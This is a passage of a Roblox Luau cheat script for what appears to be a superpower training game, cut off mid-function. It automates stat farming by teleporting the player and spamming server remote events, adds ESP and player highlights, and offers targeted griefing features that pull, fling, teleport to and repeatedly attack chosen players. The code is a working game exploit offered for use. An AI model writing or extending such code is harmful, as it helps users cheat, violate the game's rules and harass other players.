        if Toggles.FistStrength.Value then
            Framework.Runtime.Connections.FistStrength = RunService.PreRender:Connect(function()
                if GameUtility:IsAlive(LocalPlayer) then
                    local FistStrengthPosition = GameUtility:GetFistStrengthPosition(StatThresholds)
                    if FistStrengthPosition then
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(FistStrengthPosition)
                        if Toggles.SafeMode.Value then
                            LocalPlayer.Character.Humanoid.RootPart.Velocity = Vector3.new(0, 0, 0)
                            LocalPlayer.Character.Humanoid.RootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            for _, Object in LocalPlayer.Character:GetChildren() do
                                if Object:IsA("BasePart") and Object.CanCollide then
                                    Object.CanCollide = false
                                end
                            end
                        end
                    end
                    NetworkUtility:FireServer("RemoteEvent", { "Add_FS_Request" })
                end
            end)
        else
            task.delay(0.5, function()
                if not Toggles.FistStrength.Value and GameUtility:GetFistStrengthPosition(StatThresholds) and GameUtility:IsAlive(LocalPlayer) and Toggles.SafeMode.Value then
                    LocalPlayer.Character.Humanoid.RootPart:PivotTo(CFrame.new(471, 249, 889))
                    NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
                end
            end)
        end
    end)

    Toggles.BodyToughness:OnChanged(function()
        if Framework.Runtime.Connections.BodyToughness then
            Framework.Runtime.Connections.BodyToughness:Disconnect()
            Framework.Runtime.Connections.BodyToughness = nil
        end
        if Toggles.BodyToughness.Value then
            Framework.Runtime.Connections.BodyToughness = RunService.PreRender:Connect(function()
                if GameUtility:IsAlive(LocalPlayer) then
                    local BodyToughnessPosition = GameUtility:GetBodyToughnessPosition(StatThresholds)
                    if BodyToughnessPosition then
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(BodyToughnessPosition)
                        if Toggles.SafeMode.Value then
                            LocalPlayer.Character.Humanoid.RootPart.Velocity = Vector3.new(0, 0, 0)
                            LocalPlayer.Character.Humanoid.RootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            for _, Object in LocalPlayer.Character:GetChildren() do
                                if Object:IsA("BasePart") and Object.CanCollide then
                                    Object.CanCollide = false
                                end
                            end
                        end
                    else
                        NetworkUtility:FireServer("RemoteEvent", { "+BT1" })
                    end
                end
            end)
        else
            task.delay(0.5, function()
                if not Toggles.BodyToughness.Value and GameUtility:GetBodyToughnessPosition(StatThresholds) and GameUtility:IsAlive(LocalPlayer) and Toggles.SafeMode.Value then
                    LocalPlayer.Character.Humanoid.RootPart:PivotTo(CFrame.new(471, 249, 889))
                    NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
                end
            end)
        end
    end)

    Toggles.PsychicPower:OnChanged(function()
        if Framework.Runtime.Connections.PsychicPower then
            Framework.Runtime.Connections.PsychicPower:Disconnect()
            Framework.Runtime.Connections.PsychicPower = nil
        end
        if Toggles.PsychicPower.Value then
            if Toggles.JumpForceMovementSpeed.Value then
                Toggles.JumpForceMovementSpeed:SetValue(false)
            end
            Framework.Runtime.Connections.PsychicPower = RunService.PreRender:Connect(function()
                if GameUtility:IsAlive(LocalPlayer) then
                    local PsychicPowerPosition = GameUtility:GetPsychicPowerPosition(StatThresholds)
                    if PsychicPowerPosition then
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(PsychicPowerPosition)
                        if Toggles.SafeMode.Value then
                            LocalPlayer.Character.Humanoid.RootPart.Velocity = Vector3.new(0, 0, 0)
                            LocalPlayer.Character.Humanoid.RootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            for _, Object in LocalPlayer.Character:GetChildren() do
                                if Object:IsA("BasePart") and Object.CanCollide then
                                    Object.CanCollide = false
                                end
                            end
                        end
                    elseif Framework.Configuration.ClientData.QuestData.MainQuest.No > 8 and not SupportCheck then
                        NetworkUtility:FireServer("RemoteEvent", { "Update_Flying_Status", true })
                    end
                    if not LocalPlayer.Character:FindFirstChild("Meditate") and Globals.States.PsychicPowerCheck then
                        Globals.States.PsychicPowerCheck = false
                        task.wait(1)
                        if GameUtility:IsAlive(LocalPlayer) then
                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Meditate"))
                        end
                        Globals.States.PsychicPowerCheck = true
                    end
                end
            end)
        else
            task.delay(0.5, function()
                if not Toggles.PsychicPower.Value and GameUtility:GetPsychicPowerPosition(StatThresholds) and GameUtility:IsAlive(LocalPlayer) and Toggles.SafeMode.Value then
                    LocalPlayer.Character.Humanoid.RootPart:PivotTo(CFrame.new(471, 249, 889))
                    NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
                end
                if GameUtility:IsAlive(LocalPlayer) and not Toggles.PsychicPower.Value then
                    LocalPlayer.Character.Humanoid:UnequipTools()
                end
            end)
        end
    end)

    Toggles.JumpForceMovementSpeed:OnChanged(function()
        if Framework.Runtime.Connections.JumpForceMovementSpeed then
            Framework.Runtime.Connections.JumpForceMovementSpeed:Disconnect()
            Framework.Runtime.Connections.JumpForceMovementSpeed = nil
        end
        if Toggles.JumpForceMovementSpeed.Value then
            if Toggles.PsychicPower.Value then
                Toggles.PsychicPower:SetValue(false)
            end
            local LastExecutionTime = tick()
            Framework.Runtime.Connections.JumpForceMovementSpeed = RunService.PreRender:Connect(function()
                local CurrentTime = tick()
                if CurrentTime - LastExecutionTime >= 0.2 then
                    LastExecutionTime = CurrentTime
                    if GameUtility:IsAlive(LocalPlayer) then
                        local Args = GameUtility:GetMovementSpeedAndJumpForceArguments()
                        if Args then
                            NetworkUtility:FireServer("RemoteEvent", Args)
                        end
                        NetworkUtility:FireServer("RemoteEvent", { "Add_JF_Request" })
                        NetworkUtility:FireServer("RemoteEvent", { "Add_MS_Request" })
                    end
                end
            end)
        else
            task.delay(0.5, function()
                if not Toggles.JumpForceMovementSpeed.Value then
                    NetworkUtility:FireServer("RemoteEvent", { "EquipWeight_Request", 0 })
                end
            end)
        end
    end)

    Toggles.ScreenOptimization:OnChanged(function()
        if setfpscap then
            setfpscap(Toggles.ScreenOptimization.Value and 45 or math.huge)
        end
        RunService:Set3dRenderingEnabled(not Toggles.ScreenOptimization.Value)
    end)

    Options.RespawnHealth:OnChanged(function()
        Globals.GameConfiguration.Health.Respawn = Options.RespawnHealth.Value
    end)

    Toggles.StatsCounter:OnChanged(function()
        if Framework.Runtime.Connections.StatsCounter then
            Framework.Runtime.Connections.StatsCounter:Disconnect()
            Framework.Runtime.Connections.StatsCounter = nil
        end
        if Framework.Runtime.Connections.StatsCounterUpdate then
            Framework.Runtime.Connections.StatsCounterUpdate:Disconnect()
            Framework.Runtime.Connections.StatsCounterUpdate = nil
        end
        for _, Object in CoreGui:GetChildren() do
            if Object.Name == "Stats Counter" then
                Object:Destroy()
            end
        end
        if Toggles.StatsCounter.Value then
            local StatCounterGui = InstanceUtility:Create("ScreenGui", { Name = "Stats Counter", ZIndexBehavior = Enum.ZIndexBehavior.Sibling, ResetOnSpawn = false }, CoreGui)
            local MainFrame = InstanceUtility:Create("TextButton", {
                Name = "MainFrame",
                AnchorPoint = Vector2.new(0.5, 0.5),
                BackgroundColor3 = Color3.new(0.098039, 0.098039, 0.098039),
                BackgroundTransparency = 0,
                Position = UDim2.new(0.5, 0, 0.5, 0),
                Size = UDim2.new(0.25, 0, 0.28, 0),
                Active = true,
                Text = "",
                AutoButtonColor = false,
                Draggable = true,
            }, StatCounterGui, {
                InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "MainFrameCorner" }),
                InstanceUtility:Create("Frame", {
                    Name = "Time",
                    AnchorPoint = Vector2.new(1, 0.5),
                    BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                    BackgroundTransparency = 0,
                    BorderSizePixel = 1,
                    Position = UDim2.new(0.85, 0, 0.15, 0),
                    Size = UDim2.new(0.7, 0, 0.15, 0),
                }, {
                    InstanceUtility:Create("TextLabel", {
                        Name = "Time",
                        BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                        BackgroundTransparency = 1,
                        TextTransparency = 0,
                        Position = UDim2.new(0, 0, 0, 0),
                        Size = UDim2.new(1, 0, 1, 0),
                        Font = "GothamBold",
                        Text = "Time: 0s",
                        TextScaled = true,
                        TextColor3 = Color3.new(0.913725, 0.913725, 0.913725),
                        TextSize = 25,
                        TextXAlignment = Enum.TextXAlignment.Center,
                    }),
                    InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "TimeFrameCorner" }),
                }),
                InstanceUtility:Create("Frame", {
                    Name = "FistStrength",
                    AnchorPoint = Vector2.new(1, 0.5),
                    BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                    BackgroundTransparency = 0,
                    BorderSizePixel = 1,
                    Position = UDim2.new(0.49, 0, 0.4, 0),
                    Size = UDim2.new(0.46, 0, 0.21, 0),
                }, {
                    InstanceUtility:Create("TextLabel", {
                        Name = "FistStrength",
                        BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                        BackgroundTransparency = 1,
                        TextTransparency = 0,
                        Position = UDim2.new(0, 0, 0.28, 0),
                        Size = UDim2.new(1, 0, 0.48, 0),
                        Font = "GothamBold",
                        Text = "Fist: 0",
                        TextScaled = true,
                        TextColor3 = Color3.new(0.913725, 0.913725, 0.913725),
                        TextSize = 25,
                        TextXAlignment = Enum.TextXAlignment.Center,
                    }),
                    InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "FistStrengthFrameCorner" }),
                }),
                InstanceUtility:Create("Frame", {
                    Name = "BodyToughness",
                    AnchorPoint = Vector2.new(1, 0.5),
                    BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                    BackgroundTransparency = 0,
                    BorderSizePixel = 1,
                    Position = UDim2.new(0.49, 0, 0.63, 0),
                    Size = UDim2.new(0.46, 0, 0.21, 0),
                }, {
                    InstanceUtility:Create("TextLabel", {
                        Name = "BodyToughness",
                        BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                        BackgroundTransparency = 1,
                        TextTransparency = 0,
                        Position = UDim2.new(0, 0, 0.28, 0),
                        Size = UDim2.new(1, 0, 0.48, 0),
                        Font = "GothamBold",
                        Text = "Body: 0",
                        TextScaled = true,
                        TextColor3 = Color3.new(0.913725, 0.913725, 0.913725),
                        TextSize = 25,
                        TextXAlignment = Enum.TextXAlignment.Center,
                    }),
                    InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "BodyToughnessFrameCorner" }),
                }),
                InstanceUtility:Create("Frame", {
                    Name = "PsychicPower",
                    AnchorPoint = Vector2.new(1, 0.5),
                    BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                    BackgroundTransparency = 0,
                    BorderSizePixel = 1,
                    Position = UDim2.new(0.49, 0, 0.858, 0),
                    Size = UDim2.new(0.46, 0, 0.21, 0),
                }, {
                    InstanceUtility:Create("TextLabel", {
                        Name = "PsychicPower",
                        BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                        BackgroundTransparency = 1,
                        TextTransparency = 0,
                        Position = UDim2.new(0, 0, 0.28, 0),
                        Size = UDim2.new(1, 0, 0.48, 0),
                        Font = "GothamBold",
                        Text = "Psychic: 0",
                        TextScaled = true,
                        TextColor3 = Color3.new(0.913725, 0.913725, 0.913725),
                        TextSize = 25,
                        TextXAlignment = Enum.TextXAlignment.Center,
                    }),
                    InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "PsychicPowerFrameCorner" }),
                }),
                InstanceUtility:Create("Frame", {
                    Name = "MovementSpeed",
                    AnchorPoint = Vector2.new(1, 0.5),
                    BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                    BackgroundTransparency = 0,
                    BorderSizePixel = 1,
                    Position = UDim2.new(0.97, 0, 0.4, 0),
                    Size = UDim2.new(0.46, 0, 0.21, 0),
                }, {
                    InstanceUtility:Create("TextLabel", {
                        Name = "MovementSpeed",
                        BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                        BackgroundTransparency = 1,
                        TextTransparency = 0,
                        Position = UDim2.new(0, 0, 0.28, 0),
                        Size = UDim2.new(1, 0, 0.48, 0),
                        Font = "GothamBold",
                        Text = "Speed: 0",
                        TextScaled = true,
                        TextColor3 = Color3.new(0.913725, 0.913725, 0.913725),
                        TextSize = 25,
                        TextXAlignment = Enum.TextXAlignment.Center,
                    }),
                    InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "MovementSpeedFrameCorner" }),
                }),
                InstanceUtility:Create("Frame", {
                    Name = "JumpForce",
                    AnchorPoint = Vector2.new(1, 0.5),
                    BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                    BackgroundTransparency = 0,
                    BorderSizePixel = 1,
                    Position = UDim2.new(0.97, 0, 0.63, 0),
                    Size = UDim2.new(0.46, 0, 0.21, 0),
                }, {
                    InstanceUtility:Create("TextLabel", {
                        Name = "JumpForce",
                        BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                        BackgroundTransparency = 1,
                        TextTransparency = 0,
                        Position = UDim2.new(0, 0, 0.28, 0),
                        Size = UDim2.new(1, 0, 0.48, 0),
                        Font = "GothamBold",
                        Text = "Jump: 0",
                        TextScaled = true,
                        TextColor3 = Color3.new(0.913725, 0.913725, 0.913725),
                        TextSize = 25,
                        TextXAlignment = Enum.TextXAlignment.Center,
                    }),
                    InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "JumpForceFrameCorner" }),
                }),
                InstanceUtility:Create("Frame", {
                    Name = "Tokens",
                    AnchorPoint = Vector2.new(1, 0.5),
                    BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                    BackgroundTransparency = 0,
                    BorderSizePixel = 1,
                    Position = UDim2.new(0.97, 0, 0.858, 0),
                    Size = UDim2.new(0.46, 0, 0.21, 0),
                }, {
                    InstanceUtility:Create("TextLabel", {
                        Name = "Tokens",
                        BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863),
                        BackgroundTransparency = 1,
                        TextTransparency = 0,
                        Position = UDim2.new(0, 0, 0.28, 0),
                        Size = UDim2.new(1, 0, 0.48, 0),
                        Font = "GothamBold",
                        Text = "Tokens: 0",
                        TextScaled = true,
                        TextColor3 = Color3.new(0.913725, 0.913725, 0.913725),
                        TextSize = 25,
                        TextXAlignment = Enum.TextXAlignment.Center,
                    }),
                    InstanceUtility:Create("UICorner", { CornerRadius = UDim.new(0, 10), Name = "TokensFrameCorner" }),
                }),
            })

            local UpdatingStats = {
                { MainFrame.FistStrength.FistStrength, "FistStrength", Framework.Configuration.ClientData.FistStrength, "Fist", "FS" },
                { MainFrame.BodyToughness.BodyToughness, "BodyToughness", Framework.Configuration.ClientData.BodyToughness, "Body", "BT" },
                { MainFrame.PsychicPower.PsychicPower, "PsychicPower", Framework.Configuration.ClientData.PsychicPower, "Psychic", "PP" },
                { MainFrame.MovementSpeed.MovementSpeed, "MovementSpeed", Framework.Configuration.ClientData.MovementSpeed, "Speed", "MS" },
                { MainFrame.JumpForce.JumpForce, "JumpForce", Framework.Configuration.ClientData.JumpForce, "Jump", "JF" },
                { MainFrame.Tokens.Tokens, "Token", Framework.Configuration.ClientData.Token, "Token", "Token" },
            }

            local CurrentValues = {
                FistStrength = 0,
                BodyToughness = 0,
                PsychicPower = 0,
                MovementSpeed = 0,
                JumpForce = 0,
                Token = 0,
            }

            repeat
                RunService.PreRender:Wait()
            until GameUtility:IsAlive(LocalPlayer)

            local StartHP = LocalPlayer.Character.Humanoid:WaitForChild("MaxHP").Value / 10
            local StartTime = os.time()

            if SupportCheck then
                Framework.Runtime.Connections.StatsCounterUpdate = RunService.PreRender:Connect(function()
                    MainFrame.Time.Time.Text = "Time: " .. MathUtility:FormatTime(os.time() - StartTime)
                    for _, Object in UpdatingStats do
                        Object[1].Text = Object[4] .. ": " .. MathUtility:FormatNumber(Framework.Configuration.ClientData[Object[2]] - Object[3])
                    end
                end)
            else
                Framework.Runtime.Connections.StatsCounter = RemoteEvent.OnClientEvent:Connect(function(Arguments)
                    if string.split(Arguments[1], "_")[2] == "Gained" then
                        for _, Object in UpdatingStats do
                            if Object[5] == string.split(Arguments[1], "_")[1] then
                                CurrentValues[Object[2]] = CurrentValues[Object[2]] + Arguments[3]
                                Object[1].Text = Object[4] .. ": " .. MathUtility:FormatNumber(CurrentValues[Object[2]])
                            end
                        end
                    elseif Arguments[1] == "UpdateBasicStats" and Arguments[2].BodyToughness then
                        MainFrame.BodyToughness.BodyToughness.Text = "Body: " .. MathUtility:FormatNumber(Arguments[2].BodyToughness - StartHP)
                    elseif Arguments[1] == "GiveTokenNoti" then
                        CurrentValues.Token = CurrentValues.Token + Arguments[2]
                        MainFrame.Tokens.Tokens.Text = "Token: " .. MathUtility:FormatNumber(CurrentValues.Token)
                    end
                end)

                Framework.Runtime.Connections.StatsCounterUpdate = RunService.PreRender:Connect(function()
                    MainFrame.Time.Time.Text = "Time: " .. MathUtility:FormatTime(os.time() - StartTime)
                end)
            end
        end
    end)
end

do
    Toggles.Esp:OnChanged(function()
        for _, Player in PlayerList do
            if Player ~= LocalPlayer and GameUtility:IsAlive(Player) and EspContainer:FindFirstChild(Player.Name) then
                EspContainer[Player.Name].Adornee = Toggles.Esp.Value and Player.Character:WaitForChild("Head") or nil
                EspContainer[Player.Name].Enabled = Toggles.Esp.Value
            end
        end
        if Framework.Runtime.Connections.Esp then
            Framework.Runtime.Connections.Esp:Disconnect()
            Framework.Runtime.Connections.Esp = nil
        end
        if Toggles.Esp.Value then
            Framework.Runtime.Connections.Esp = RunService.PreRender:Connect(function()
                if GameUtility:IsAlive(LocalPlayer) then
                    for _, Player in PlayerList do
                        if Player ~= LocalPlayer and GameUtility:IsAlive(Player) and EspContainer:FindFirstChild(Player.Name) then
                            local EspFolder = EspContainer:FindFirstChild(Player.Name)
                            local Distance = (LocalPlayer.Character.Humanoid.RootPart.Position - Player.Character.Humanoid.RootPart.Position).Magnitude
                            EspFolder.Frame.Distance.Text = "Distance: " .. math.floor(Distance)
                        end
                    end
                end
            end)
        end
    end)

    Toggles.Highlights:OnChanged(function()
        for _, Player in PlayerList do
            if Player ~= LocalPlayer and GameUtility:IsAlive(Player) and HighlightsContainer:FindFirstChild(Player.Name) then
                HighlightsContainer[Player.Name].Adornee = Toggles.Highlights.Value and Player.Character or nil
                HighlightsContainer[Player.Name].Enabled = Toggles.Highlights.Value
            end
        end
    end)

    Options.Time:OnChanged(function()
        LightingService.ClockTime = Options.Time.Value
    end)

    LightingService.ClockTime = Options.Time.Value

    if Framework.Runtime.Connections.TimeUpdate then
        Framework.Runtime.Connections.TimeUpdate:Disconnect()
    end
    Framework.Runtime.Connections.TimeUpdate = LightingService:GetPropertyChangedSignal("ClockTime"):Connect(function()
        LightingService.ClockTime = Options.Time.Value
    end)
end

do
    Toggles.AutoClaimQuests:OnChanged(function()
        if Framework.Runtime.Connections.AutoClaimQuests then
            Framework.Runtime.Connections.AutoClaimQuests:Disconnect()
            Framework.Runtime.Connections.AutoClaimQuests = nil
        end
        if Toggles.AutoClaimQuests.Value then
            local LastQuestTime = tick()
            Framework.Runtime.Connections.AutoClaimQuests = RunService.PreRender:Connect(function()
                local CurrentTime = tick()
                if CurrentTime - LastQuestTime >= 1 then
                    LastQuestTime = CurrentTime
                    for _, Quest in { "FS", "BT", "MS", "JF", "PP" } do
                        NetworkUtility:FireServer("RemoteEvent", { "DLQ", Quest, "Claim" })
                        task.wait(0.2)
                    end
                    for _, Quest in { "FS", "BT", "PP" } do
                        for Index = 1, 3 do
                            NetworkUtility:FireServer("RemoteEvent", { "WLQ", Quest .. Index, "Claim" })
                            task.wait(0.2)
                        end
                    end
                end
            end)
        end
    end)

    Toggles.AutoCompleteQuests:OnChanged(function()
        if Framework.Runtime.Connections.AutoCompleteQuests then
            Framework.Runtime.Connections.AutoCompleteQuests:Disconnect()
            Framework.Runtime.Connections.AutoCompleteQuests = nil
        end
        if Toggles.AutoCompleteQuests.Value then
            local LastCompleteTime = tick()
            Framework.Runtime.Connections.AutoCompleteQuests = RunService.PreRender:Connect(function()
                local CurrentTime = tick()
                if CurrentTime - LastCompleteTime >= 1 then
                    LastCompleteTime = CurrentTime
                    NetworkUtility:FireServer("RemoteEvent", { "QuestTalkStart", "Sath" })
                    task.wait(0.5)
                    NetworkUtility:FireServer("RemoteEvent", { "QuestTalkEnd", "Sath" })
                end
            end)
        end
    end)

    Toggles.AntiKillingIntentAura:OnChanged(function()
        if Toggles.AntiKillingIntentAura.Value then
            for _, Player in PlayerList do
                if GameUtility:IsAlive(Player) then
                    for _, Object in Player.Character:GetChildren() do
                        if Object.Name == "KillingIntentPart" then
                            Object:Destroy()
                        end
                    end
                end
            end
        end
    end)

    Options.Animations:OnChanged(function()
        if GameUtility:IsAlive(LocalPlayer) then
            if Options.Animations.Value and Options.Animations.Value ~= "None" then
                for _, Object in Globals.AnimationPackages[Options.Animations.Value] do
                    local Action, SubAction, AssetId = unpack(Object)
                    LocalPlayer.Character:WaitForChild("Animate"):WaitForChild(Action)[SubAction].AnimationId = AssetId
                end
                LocalPlayer.Character.Humanoid.Jump = true
            else
                NetworkUtility:FireServer("RemoteEvent", { "Respawn" })
            end
        end
    end)

    Options.Fov:OnChanged(function()
        Camera.FieldOfView = Options.Fov.Value
    end)
end

do
    Options.Targets:OnChanged(function()
        for _, Player in PlayerList do
            if string.find(string.lower(Player.Name), string.lower(Options.Targets.Value)) then
                if Player ~= LocalPlayer then
                    Globals.PlayersData.CurrentTarget = Player.Name
                    break
                end
            end
        end
        Library:Notify({ Title = "Selected", Description = Globals.PlayersData.CurrentTarget, Time = 3 })
    end)

    Toggles.CBring:OnChanged(function()
        if Framework.Runtime.Connections.CBring then
            Framework.Runtime.Connections.CBring:Disconnect()
            Framework.Runtime.Connections.CBring = nil
        end
        if Toggles.CBring.Value then
            Framework.Runtime.Connections.CBring = RunService.PreRender:Connect(function()
                for _, Target in Globals.PlayersData.Targets do
                    if Target ~= LocalPlayer and GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                        PlayersService:FindFirstChild(Target).Character.Humanoid.RootPart:PivotTo(LocalPlayer.Character.Humanoid.RootPart:GetPivot() * CFrame.new(0, 0, -1))
                    end
                end
            end)
        end
    end)

    Toggles.SpamPunch:OnChanged(function()
        if Framework.Runtime.Connections.SpamPunch then
            Framework.Runtime.Connections.SpamPunch:Disconnect()
            Framework.Runtime.Connections.SpamPunch = nil
        end
        if Toggles.SpamPunch.Value then
            Framework.Runtime.Connections.SpamPunch = RunService.PreRender:Connect(function()
                NetworkUtility:FireServer("RemoteEvent", { "Skill_Punch", "Left" })
                NetworkUtility:FireServer("RemoteEvent", { "Skill_Punch", "Right" })
            end)
        end
    end)

    Toggles.SpamSphere:OnChanged(function()
        if Framework.Runtime.Connections.SpamSphere then
            Framework.Runtime.Connections.SpamSphere:Disconnect()
            Framework.Runtime.Connections.SpamSphere = nil
        end
        if Toggles.SpamSphere.Value then
            Framework.Runtime.Connections.SpamSphere = RunService.PreRender:Connect(function()
                NetworkUtility:FireServer("RemoteEvent", { "Skill_SpherePunch", Vector3.new(0, 1e20, 0) })
                for _, Sphere in Storage:GetChildren() do
                    if Sphere.Name == GameUtility:GetSphere(StatThresholds) then
                        Sphere:PivotTo(LocalPlayer.Character.Humanoid.RootPart:GetPivot())
                    end
                end
            end)
        end
    end)

    Toggles.Stack:OnChanged(function()
        if Framework.Runtime.Connections.Stack then
            Framework.Runtime.Connections.Stack:Disconnect()
            Framework.Runtime.Connections.Stack = nil
        end
        if Toggles.Stack.Value then
            Framework.Runtime.Connections.Stack = RunService.PreRender:Connect(function()
                if GameUtility:IsAlive(LocalPlayer) then
                    NetworkUtility:FireServer("RemoteEvent", { "Skill_SpherePunch", Vector3.new(0, 1e20, 0) })
                    LocalPlayer.Character.Humanoid.RootPart:PivotTo(CFrame.new(0, 1e6, 0))
                    LocalPlayer.Character.Humanoid.RootPart.Velocity = Vector3.new(0, 0, 0)
                    LocalPlayer.Character.Humanoid.RootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                end
                for _, Target in Globals.PlayersData.Targets do
                    if GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) and not PlayersService:FindFirstChild(Target).Character:FindFirstChild("SafeZoneShield") and not PlayersService:FindFirstChild(Target).Character:FindFirstChild("ForceField") then
                        PlayersService:FindFirstChild(Target).Character.Humanoid.RootPart:PivotTo(CFrame.new(5e2, 5e3, 5e2))
                        for _, Sphere in Storage:GetChildren() do
                            if Sphere.Name == GameUtility:GetSphere(StatThresholds) then
                                FireTouchInterest(PlayersService:FindFirstChild(Target).Character.Humanoid.RootPart, Sphere, 0)
                            end
                        end
                    end
                end
            end)
        else
            task.delay(1, function()
                if GameUtility:IsAlive(LocalPlayer) then
                    LocalPlayer.Character.Humanoid.RootPart:PivotTo(CFrame.new(471, 249, 889))
                end
            end)
        end
    end)

    Toggles.Spectate:OnChanged(function()
        if Framework.Runtime.Connections.SpectateCharacterAdded then
            Framework.Runtime.Connections.SpectateCharacterAdded:Disconnect()
            Framework.Runtime.Connections.SpectateCharacterAdded = nil
        end
        if Framework.Runtime.Connections.CameraChanged then
            Framework.Runtime.Connections.CameraChanged:Disconnect()
            Framework.Runtime.Connections.CameraChanged = nil
        end
        if Toggles.Spectate.Value then
            for _, Target in Globals.PlayersData.Targets do
                if GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                    Camera.CameraSubject = PlayersService:FindFirstChild(Target).Character
                end
                Framework.Runtime.Connections.SpectateCharacterAdded = PlayersService:FindFirstChild(Target).CharacterAdded:Connect(function(Character)
                    Camera.CameraSubject = Character:WaitForChild("Humanoid")
                end)
                Framework.Runtime.Connections.CameraChanged = Camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
                    if PlayersService:FindFirstChild(Target) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                        Camera.CameraSubject = PlayersService:FindFirstChild(Target).Character.Humanoid
                    end
                end)
            end
        else
            if GameUtility:IsAlive(LocalPlayer) then
                Camera.CameraSubject = LocalPlayer.Character
            end
        end
    end)

    Toggles.SoulAttack:OnChanged(function()
        if Framework.Runtime.Connections.SoulAttack then
            Framework.Runtime.Connections.SoulAttack:Disconnect()
            Framework.Runtime.Connections.SoulAttack = nil
        end
        if Toggles.SoulAttack.Value then
            Framework.Runtime.Connections.SoulAttack = RunService.PreRender:Connect(function()
                for _, Target in Globals.PlayersData.Targets do
                    if GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) and not PlayersService:FindFirstChild(Target).Character:FindFirstChild("ForceField") and not PlayersService:FindFirstChild(Target).Character:FindFirstChild("SafeZoneShield") then
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(PlayersService:FindFirstChild(Target).Character.Humanoid.RootPart:GetPivot() + PlayersService:FindFirstChild(Target).Character.Humanoid.RootPart:GetPivot().UpVector * 40)
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_SoulAttack_Start", PlayersService:FindFirstChild(Target) })
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_SoulAttack_End" })
                        break
                    end
                end
            end)
        end
    end)

    Toggles.SoulReap:OnChanged(function()
        if Framework.Runtime.Connections.SoulReap then
            Framework.Runtime.Connections.SoulReap:Disconnect()
            Framework.Runtime.Connections.SoulReap = nil
        end
        if Toggles.SoulReap.Value then
            Framework.Runtime.Connections.SoulReap = RunService.PreRender:Connect(function()
                for _, Target in Globals.PlayersData.Targets do
                    if GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) and not PlayersService:FindFirstChild(Target).Character:FindFirstChild("ForceField") and not PlayersService:FindFirstChild(Target).Character:FindFirstChild("SafeZoneShield") then
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_SoulReap", PlayersService:FindFirstChild(Target) })
                        break
                    end
                end
            end)
        end
    end)

    Toggles.HellFire:OnChanged(function()
        if Framework.Runtime.Connections.HellFire then
            Framework.Runtime.Connections.HellFire:Disconnect()
            Framework.Runtime.Connections.HellFire = nil        end
        if Toggles.HellFire.Value then
            Framework.Runtime.Connections.HellFire = RunService.PreRender:Connect(function()
                for _, Target in Globals.PlayersData.Targets do
                    if GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                        NetworkUtility:FireServer("RemoteEvent", { "Skill_Hellfire", PlayersService:FindFirstChild(Target) })
                        break
                    end
                end
            end)
        end
    end)

    Toggles.LoopTeleport:OnChanged(function()
        if Framework.Runtime.Connections.LoopTeleport then
            Framework.Runtime.Connections.LoopTeleport:Disconnect()
            Framework.Runtime.Connections.LoopTeleport = nil
        end
        if Toggles.LoopTeleport.Value then
            Framework.Runtime.Connections.LoopTeleport = RunService.PreRender:Connect(function()
                for _, Target in Globals.PlayersData.Targets do
                    if GameUtility:IsAlive(LocalPlayer) and GameUtility:IsAlive(PlayersService:FindFirstChild(Target)) then
                        LocalPlayer.Character.Humanoid.RootPart.Velocity = Vector3.new(0, 0, 0)
                        LocalPlayer.Character.Humanoid.RootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        LocalPlayer.Character.Humanoid.RootPart:PivotTo(PlayersService:FindFirstChild(Target).Character.Humanoid.RootPart:GetPivot())
                    end
                end
            end)
        end
    end)

    Toggles.SitOnHead:OnChanged(function()
        if Framework.Runtime.Connections.SitOnHead then
            Framework.Runtime.Connections.SitOnHead:Disconnect()
            Framework.Runtime.Connections.SitOnHead = nil
        end
        if Toggles.SitOnHead.Value then
